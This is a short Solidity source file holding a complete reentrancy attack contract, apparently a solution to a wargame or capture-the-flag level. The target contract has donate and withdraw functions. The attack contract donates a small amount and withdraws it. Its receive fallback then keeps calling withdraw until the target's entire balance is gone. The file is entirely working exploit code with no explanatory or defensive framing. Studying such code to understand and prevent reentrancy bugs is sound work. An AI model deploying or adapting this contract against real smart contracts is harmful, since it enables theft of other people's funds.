// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract AttackReentrance {

    address public target;
    IReentrance private immutable reentrance;

    constructor(address _target) {
        reentrance = IReentrance(_target);
        target = _target;
    }

    function attack() external payable {
      reentrance.donate{value: 0.001 ether}(address(this));
      reentrance.withdraw(0.001 ether);
    }

    receive() external payable {        
      if (address(target).balance >= 0.001 ether) {
            reentrance.withdraw(0.001 ether);
        } else if (address(target).balance > 0 ether) {
            reentrance.withdraw(address(target).balance);
      }
    }
}